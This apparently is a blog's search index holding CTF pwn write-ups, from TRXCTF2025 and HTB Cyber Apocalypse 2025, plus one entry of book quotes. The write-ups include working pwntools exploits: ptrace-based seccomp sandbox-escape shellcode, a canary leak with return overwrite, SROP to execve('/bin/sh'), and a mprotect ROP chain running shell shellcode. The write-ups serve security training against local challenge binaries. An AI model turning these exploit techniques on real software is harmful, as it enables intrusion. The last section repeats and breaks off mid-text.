[{"categories":["WP"],"content":"\rcanon_event ptrace + 沙箱绕过 int __fastcall main(int argc, const char **argv, const char **envp) { void *v3; // rbx void *v4; // rax void *v5; // r12 unsigned int uint; // ebp v3 = mmap((void *)0xDEAD000, 0x1000u, 3, 50, -1, 0); v4 = mmap((void *)0xDEAE000, 0x1000u, 3, 50, -1, 0); if ( v3 == (void *)-1LL || (v5 = v4, v4 == (void *)-1LL) ) err(1, \"mmap failed\"); printf(\"code size: \"); uint = get_uint(); // 输入shellcode长度 if ( uint \u003e 0x1000 ) // shellcode长度大于0x1000就报错 { puts(\"invalid code size\"); exit(1); } printf(\"enter shellcode: \"); if ( read(0, v3, uint) \u003c 0 ) // 读入shellcode err(1, \"read failed\"); if ( mprotect(v3, 0x1000u, 5) \u003c 0 ) err(1, \"mprotect failed\"); isolate_and_jump((void (__fastcall *)(_QWORD, void *))v3, v5); //开sandbox，然后去执行shellcode return 0; } line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x0000000c A = instruction_pointer \u003e\u003e 32 0001: 0x35 0x04 0x00 0x00008000 if (A \u003e= 0x8000) goto 0006 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x02 0x00 0x0000003d if (A == wait4) goto 0006 0004: 0x15 0x01 0x00 0x00000065 if (A == ptrace) goto 0006 0005: 0x15 0x00 0x01 0x00000039 if (A != fork) goto 0007 0006: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0007: 0x06 0x00 0x00 0x80000000 return KILL_PROCESS 只允许三个系统调用：wait4、ptrace、fork exp: #!/usr/bin/env python3 from pwn import * from time import sleep exe = ELF(\"./pwn\") context.terminal = [\"tmux\", \"splitw\", \"-h\"] context.binary = exe def dbg(r): gdb.attach(r) pause() # DOCKER_PORT = 1337 # REMOTE_NC_CMD = \"nc localhost 444\" # `nc \u003chost\u003e \u003cport\u003e` bstr = lambda x: str(x).encode() ELF.binsh = lambda self: next(self.search(b\"/bin/sh\\0\")) GDB_SCRIPT = \"\"\" set follow-fork-mode child set follow-exec-mode same c \"\"\" def main(): r = process(\"./pwn\") PTRACE_CONT = 7 PTRACE_GETREGS = 12 PTRACE_SETREGS = 13 PTRACE_SYSCALL = 24 RIP_OFFSET = 8*16 shellcode = asm(f\"\"\" mov eax, SYS_fork syscall test eax, eax jz child mov r13, rax mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_SYSCALL} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_GETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov rdi, 0x820000000000 lea rbx, [rsp+{RIP_OFFSET}] mov [rbx], rdi mov eax, SYS_ptrace mov edi, {PTRACE_SETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov eax, SYS_ptrace mov edi, {PTRACE_CONT} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 mov rsi, rsp xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_GETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall lea rdi, [rip+sendfile] lea rbx, [rsp+{RIP_OFFSET}] mov [rbx], rdi mov eax, SYS_ptrace mov edi, {PTRACE_SETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov eax, SYS_ptrace mov edi, {PTRACE_SYSCALL} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_GETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov rdi, 0x820000000000 lea rbx, [rsp+{RIP_OFFSET}] mov [rbx], rdi mov eax, SYS_ptrace mov edi, {PTRACE_SETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov eax, SYS_ptrace mov edi, {PTRACE_CONT} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall hlt child: mov eax, SYS_ptrace xor edi, edi xor esi, esi xor edx, edx xor r10, r10 syscall int3 open: mov eax, SYS_open lea rdi, [rip+flag] xor esi, esi xor edx, edx syscall sendfile: mov rax, SYS_sendfile mov rdi, 1 mov rsi, 3 xor edx, edx mov r10, 0x50 syscall hlt flag: \"\"\") + b\"flag.txt\\0\" dbg(r) r.sendline(bstr(len(shellcode))) r.send(shellcode) r.interactive() if __name__ == \"__main__\": main() shellcode解释： SYS_fork parent_process: wait4 //等待TRACEME PTRACE_SYSCALL //捕获下一次syscall信号，即open的syscall wait4 //等待open的syscall开始 PTRACE_GETREGS //获取寄存器","date":"2025-08-07","objectID":"/posts/trxctf2025/:1:0","series":null,"tags":null,"title":"TRXCTF2025","uri":"/posts/trxctf2025/#canon_event"},{"categories":["WP"],"content":"\rVirtual_Insanity 栈溢出+利用vsyscall 就不写了。。。 ","date":"2025-08-07","objectID":"/posts/trxctf2025/:2:0","series":null,"tags":null,"title":"TRXCTF2025","uri":"/posts/trxctf2025/#virtual_insanity"},{"categories":["阅读"],"content":" 不太喜欢发表个人观点，记一些有感触的话 quote\r“为什么人很容易飘飘然？因为你浅薄呀 浅薄的东西就是容易飘起来” ——罗翔\rquote\r“我们画不出那个完美的圆，但是我们仍然应当努力，虽不能至心向往之”\rquote\r“我们每个人都并不优越于他人，每个人都是有限的。我们时常需要聆听苏格拉底的德尔菲神谕，承认自己的无知和有限，渺小和幽暗”\rquote\r“本质上，过分的夸奖与过分的批评不都是误解吗？误解本来就是人生常态，不要喜欢好听的误解，而厌恶不好听的误解。”\r","date":"2025-08-06","objectID":"/posts/%E6%B3%95%E6%B2%BB%E7%9A%84%E7%BB%86%E8%8A%82/:0:0","series":null,"tags":null,"title":"【阅读】法治的细节——罗翔","uri":"/posts/%E6%B3%95%E6%B2%BB%E7%9A%84%E7%BB%86%E8%8A%82/#"},{"categories":["WP"],"content":" HTB的一个比赛 ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:0:0","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#"},{"categories":["WP"],"content":"\rQuack_Quack unsigned __int64 duckling() { char *v1; // [rsp+8h] [rbp-88h] _QWORD buf[4]; // [rsp+10h] [rbp-80h] BYREF _QWORD v3[11]; // [rsp+30h] [rbp-60h] BYREF unsigned __int64 v4; // [rsp+88h] [rbp-8h] v4 = __readfsqword(0x28u); memset(buf, 0, sizeof(buf)); memset(v3, 0, 80); printf(\"Quack the Duck!\\n\\n\u003e \"); fflush(_bss_start); read(0, buf, 0x66u); v1 = strstr((const char *)buf, \"Quack Quack \"); if ( !v1 ) { error(\"Where are your Quack Manners?!\\n\"); exit(1312); } printf(\"Quack Quack %s, ready to fight the Duck?\\n\\n\u003e \", v1 + 32); read(0, v3, 0x6Au); puts(\"Did you really expect to win a fight against a Duck?!\\n\"); return v4 - __readfsqword(0x28u); } unsigned __int64 duck_attack() { char buf; // [rsp+3h] [rbp-Dh] BYREF int fd; // [rsp+4h] [rbp-Ch] unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); fd = open(\"./flag.txt\", 0); if ( fd \u003c 0 ) { perror(\"\\nError opening flag.txt, please contact an Administrator\\n\"); exit(1); } while ( read(fd, \u0026buf, 1u) \u003e 0 ) fputc(buf, _bss_start); close(fd); return v3 - __readfsqword(0x28u); } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:0","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#quack_quack"},{"categories":["WP"],"content":"\rstrstr函数 #include \u003cstring.h\u003e char *strstr(const char *haystack, const char *needle); 功能：在 haystack（主字符串）中查找 needle（子字符串）的首次出现位置。 返回值： 找到时：返回指向首次匹配位置的指针。 未找到时：返回 NULL。 char *s = \"Hello_CTF_World\"; char *p = strstr(s, \"CTF\"); // p 指向 \"CTF_World\" ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#strstr函数"},{"categories":["WP"],"content":"\r思路 通过strstr函数，控制v1指针 让v1+32指向canary，第20行的printf会输出canary read进canary、控制返回地址到duck_attack，输出flag ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:2","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#思路"},{"categories":["WP"],"content":"\rexp from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './quack_quack' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) backdoor = 0x40137F #canary会以\\x00结尾，所以要加个1 p.recvuntil(b'Quack the Duck!\\n\\n\u003e ') pl = b'a'*(0x80 - 0x8 - 0x20 + 1) + b\"Quack Quack \" # dbg() p.send(pl) p.recvuntil(b'Quack Quack ') canary = u64(p.recv(7).rjust(8,b'\\x00')) #在低位补\\x00 success(\"canary---\u003e 0x%x\",canary) pl = b'a'*(0x60 - 0x8) pl+= p64(canary) pl+=p64(0xdeedbeef) pl+= p16(0x137f) # dbg() p.send(pl) p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:3","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp"},{"categories":["WP"],"content":"\rblessing int __fastcall main(int argc, const char **argv, const char **envp) { size_t size; // [rsp+8h] [rbp-28h] BYREF unsigned __int64 i; // [rsp+10h] [rbp-20h] _QWORD *v6; // [rsp+18h] [rbp-18h] void *buf; // [rsp+20h] [rbp-10h] unsigned __int64 v8; // [rsp+28h] [rbp-8h] v8 = __readfsqword(0x28u); setup(argc, argv, envp); banner(); size = 0; v6 = malloc(0x30000u); *v6 = 1; printstr( \"In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gift!\\n\" \"\\n\" \"Please accept this: \"); printf(\"%p\", v6); sleep(1u); for ( i = 0; i \u003c= 0xD; ++i ) { printf(\"\\b \\b\"); usleep(0xEA60u); } puts(\"\\n\"); printf( \"%s[%sBard%s]: Now, I want something in return...\\n\\nHow about a song?\\n\\nGive me the song's length: \", \"\\x1B[1;34m\", \"\\x1B[1;32m\", \"\\x1B[1;34m\"); __isoc99_scanf(\"%lu\", \u0026size); buf = malloc(size); printf(\"\\n%s[%sBard%s]: Excellent! Now tell me the song: \", \"\\x1B[1;34m\", \"\\x1B[1;32m\", \"\\x1B[1;34m\"); read(0, buf, size); *(_QWORD *)((char *)buf + size - 1) = 0; write(1, buf, size); if ( *v6 ) printf(\"\\n%s[%sBard%s]: Your song was not as good as expected...\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;32m\", \"\\x1B[1;31m\"); else read_flag(); return 0; } man malloc RETURN VALUE The malloc(), calloc(), realloc(), and reallocarray() functions return a pointer to the allocated memory, which is suitably aligned for any type that fits into the requested size or less. On error, these functions return NULL and set errno. Attempting to allocate more than PTRDIFF_MAX bytes is considered an error, as an object that large could cause later pointer subtraction to overflow. ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:2:0","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#blessing"},{"categories":["WP"],"content":"\r思路 程序会输出heap_addr heap_addr很大，malloc(heap_addr)的时候，系统直接拒绝，返回NULL 所以可以控制 (_QWORD *)((char *)buf + size - 1) = v6 就可以让 *v6 = 0，去readflag ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:2:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#思路-1"},{"categories":["WP"],"content":"\rexp from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './blessing' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) p.recvuntil(b'Please accept this: ') heap_addr = int(p.recv(14),16) success(\"heap_addr = 0x%x\",heap_addr) # dbg() p.sendlineafter(b'length: ',str(heap_addr +1)) p.send(b'a') p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:2:2","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-1"},{"categories":["WP"],"content":"\rlaconic 考察SROP 程序就几句汇编 public _start _start proc near mov rdi, 0 ; Alternative name is '_start' ; __start mov rsi, rsp sub rsi, 8 mov rdx, 106h syscall ; LINUX - retn _start endp 可以发现有栈溢出 有发现binsh，但是IDA里没显示 pwndbg\u003e search \"/bin/sh\" Searching for value: '/bin/sh' laconic 0x43238 0x68732f6e69622f /* '/bin/sh' */ 直接execve(\"/bin/sh\",0,0)就可以了 ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:3:0","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#laconic"},{"categories":["WP"],"content":"\rexp from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './laconic' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) binsh = 0x43238 pop_rax_ret = 0x43018 syscall_ret = 0x43015 pl = b'a'*8 pl+= p64(pop_rax_ret) pl+= p64(15) pl+=p64(syscall_ret) frame = SigreturnFrame() frame.rax = 0x3b frame.rdi = binsh frame.rsi = 0x0 frame.rdx = 0x0 frame.rip = syscall_ret pl+= bytes(frame) p.send(pl) p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:3:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-2"},{"categories":["WP"],"content":"\rcrossbow查看两个关键函数 __int64 __fastcall training(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6) { __int64 v6; // rdx __int64 v7; // rcx int v8; // r8d int v9; // r9d int v10; // r8d int v11; // r9d _BYTE v13[32]; // [rsp+0h] [rbp-20h] BYREF printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: You only have 1 shot, don't miss!!\\n\", (unsigned int)\"\\x1B[1;34m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;34m\", a5, a6); target_dummy((__int64)v13, (__int64)\"\\x1B[1;34m\", v6, v7, v8, v9); return printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: That was quite a shot!!\\n\\n\", (unsigned int)\"\\x1B[1;34m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;34m\", v10, v11); } //这里我省略了一些无关代码 __int64 __fastcall target_dummy(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6) { int v6; // edx int v7; // ecx int v8; // r8d int v9; // r9d int v10; // r8d int v11; // r9d _QWORD *v12; // rbx int v13; // r8d int v14; // r9d __int64 result; // rax int v16; // r8d int v17; // r9d int v18; // [rsp+1Ch] [rbp-14h] BYREF if ( (unsigned int)scanf((unsigned int)\"%d%*c\", (unsigned int)\u0026v18, v6, v7, v8, v9) != 1 ) { printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\\n\\n\", (unsigned int)\"\\x1B[1;31m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;31m\", v10, v11); exit(1312); } v12 = (_QWORD *)(8LL * v18 + a1); *v12 = calloc(1, 128); if ( !*v12 ) { printf( (unsigned int)\"%s\\n[%sSir Alaric%s]: We do not want cowards here!!\\n\\n\", (unsigned int)\"\\x1B[1;31m\", (unsigned int)\"\\x1B[1;33m\", (unsigned int)\"\\x1B[1;31m\", v13, v14); exit(6969); } result = fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128, \u0026_stdin_FILE); return result; } v12 = (_QWORD *)(8LL * v18 + a1); *v12 = calloc(1, 128); 这里的v18可以通过前面的scanf控制，a1是caller函数（training）的变量v13。v13-0x10(a1-0x10)是target函数(callee)的rbp 这里把v18设置成-0x10，那么，target函数leave;ret的时候，training函数的rbp和training函数的返回地址就会被我们控制(通过fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128, \u0026_stdin_FILE);) ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:4:0","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#crossbow"},{"categories":["WP"],"content":"\rexp from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './crossbow' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) pop_rax_ret = 0x401001 pop_rdi_ret = 0x401d6c pop_rsi_ret = 0x40566b pop_rdx_ret = 0x401139 syscall_ret = 0x404b51 #mprotect 0xa read 0 fgets = 0x401CC0 stdin = 0x40E020 mprotect_addr = 0x40a320 # dbg() p.recvuntil(b'shoot: ') p.sendline(b'-2') #mprotect给bss段权限7，read读入shellcraft.sh进bss #然后执行shellcode p.recvuntil(b'\u003e ') #mprotect(0x40e000,0x1000,7) pl = b'a'*8 pl += p64(pop_rdi_ret) + p64(0x40e000) pl+= p64(pop_rsi_ret) + p64(0x1000) pl+= p64(pop_rdx_ret) + p64(7) pl+= p64(mprotect_addr) pl+= p64(pop_rdi_ret) + p64(0x40E220) pl+= p64(pop_rsi_ret) + p64(0x100) pl+= p64(pop_rdx_ret) + p64(stdin) pl+= p64(fgets) pl+= p64(0x40e221) # dbg() p.send(pl) # dbg() p.send(asm(shellcraft.sh())) p.interactive() 这里执行shellcode的地址是0x40e221 pwndbg\u003e disassemble /r 0x40e220, 0x40e250 Dump of assembler code from 0x40e220 to 0x40e250: 0x000000000040e220 \u003ccompleted+0\u003e: 00 6a 68 add BYTE PTR [rdx+0x68],ch 0x000000000040e223: 48 b8 2f 00 00 00 00 00 00 00 movabs rax,0x2f 0x000000000040e22d \u003c__sysinfo+5\u003e: 00 00 add BYTE PTR [rax],al pwndbg\u003e disassemble /r 0x40e221, 0x40e230 Dump of assembler code from 0x40e221 to 0x40e230: 0x000000000040e221: 6a 68 push 0x68 0x000000000040e223: 48 b8 2f 00 00 00 00 00 00 00 movabs rax,0x2f 可以看到，从0x40e221开始才是正确的shellcode 可能是fgets_unlock就是这样的： RAX 0x6a RBX 0x40e020 (__stdin_FILE) ◂— 0x49 /* 'I' */ RCX 1 RDX 0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */ RDI 1 RSI 0x743046e24010 —▸ 0x743046e24067 ◂— 0x3f07dd419300946a R8 0x1c R9 0x3d R10 7 R11 0x202 R12 0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */ R13 0x40e300 (buf) ◂— add byte ptr [rax], al /* 0xa00000000000000 */ R14 0 R15 0xfe RBP 0x6161616161616161 ('aaaaaaaa') RSP 0x743046e24080 —▸ 0x40a356 (mprotect+54) ◂— add rsp, 8 *RIP 0x401db6 (fgets_unlocked+246) ◂— mov byte ptr [rdx], al EFLAGS 0x206 [ cf PF af zf sf IF df of ] ─────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────── 0x401ddd \u003cfgets_unlocked+285\u003e call __uflow \u003c__uflow\u003e 0x401de2 \u003cfgets_unlocked+290\u003e test eax, eax 0x6a \u0026 0x6a EFLAGS =\u003e 0x206 [ cf PF af zf sf IF df of ] 0x401de4 \u003cfgets_unlocked+292\u003e js fgets_unlocked+449 \u003cfgets_unlocked+449\u003e 0x401dea \u003cfgets_unlocked+298\u003e mov rdx, r12 RDX =\u003e 0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */ 0x401ded \u003cfgets_unlocked+301\u003e jmp fgets_unlocked+246 \u003cfgets_unlocked+246\u003e ↓ ► 0x401db6 \u003cfgets_unlocked+246\u003e mov byte ptr [rdx], al [buf+1] =\u003e 0x6a 0x401db8 \u003cfgets_unlocked+248\u003e sub r15d, 1 R15D =\u003e 253 (0xfe - 0x1) 0x401dbc \u003cfgets_unlocked+252\u003e lea r12, [rdx + 1] R12 =\u003e 0x40e302 (buf+2) ◂— add byte ptr [rax], al /* 0xa0000000000 */ 0x401dc0 \u003cfgets_unlocked+256\u003e cmp al, 0xa 0x6a - 0xa EFLAGS =\u003e 0x206 [ cf PF af zf sf IF df of ] 0x401dc2 \u003cfgets_unlocked+258\u003e je fgets_unlocked+137 \u003cfgets_unlocked+137\u003e 0x401dc4 \u003cfgets_unlocked+260\u003e test r15d, r15d 0xfd \u0026 0xfd EFLAGS =\u003e 0x202 [ cf pf af zf sf IF df of ] ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:4:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-3"},{"categories":["WP"],"content":"\rstrategist tcache posioning ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:0","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#strategist"},{"categories":["WP"],"content":"\r逆向分析\rmenu __int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#逆向分析"},{"categories":["WP"],"content":"\r逆向分析\rmenu __int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please 